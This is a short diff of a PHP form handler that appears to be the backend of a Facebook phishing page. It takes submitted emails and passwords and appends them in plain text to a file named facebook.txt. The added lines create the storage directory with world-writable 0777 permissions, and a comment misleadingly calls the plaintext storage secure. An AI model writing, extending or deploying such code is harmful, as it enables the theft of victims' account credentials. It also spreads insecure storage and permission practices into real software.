@@ -6,6 +6,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     // Validate email and password
     if (filter_var($email, FILTER_VALIDATE_EMAIL) && !empty($password)) {
+        // Ensure the data directory exists
+        if (!is_dir('../data')) {
+            mkdir('../data', 0777, true);
+        }
+
         // Save the data to a file securely
         $file = fopen("../data/facebook.txt", "a");
         fwrite($file, "Email: $email\nPassword: $password\n\n");
